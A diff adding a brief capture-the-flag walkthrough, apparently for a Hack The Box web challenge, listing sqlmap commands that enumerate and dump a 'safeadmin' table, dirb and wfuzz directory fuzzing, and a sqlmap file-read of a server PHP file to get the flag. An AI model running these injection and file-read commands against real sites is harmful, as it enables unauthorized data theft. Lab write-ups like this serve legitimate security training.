@@ -1,0 +1,9 @@
+1) look in html code and find comment of "portfolio.php?id=1"
+2) run sql map on this site, sqlmap -u "docker.hackthebox.eu:PORT/portfolio.php?id=1" --tables
+3) we find an interesting table in the database (freelancer), safeadmin
+4) dump this table with, sqlmap -u "docker.hackthebox.eu:PORT/portfolio.php?id=1" -T safeadmin --dump
+5) I tried cracking it but to no avail, but now we know you can use sqlmap and they are vunerable
+6) run dirb and wfuzz to fuzz the site for extra directories, you will find /administrat/panel.php. dirb http://docker.hackthebox.eu:PORT/ then, wfuzz -w big.txt http://docker.hackthebox.eu:PORT/administrat/FUZZ.php
+7) then guess the common file directory and download it using the sql vunerability
+8) sqlmap -u http://docker.hackthebox.eu:PORT/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
+9) read flag
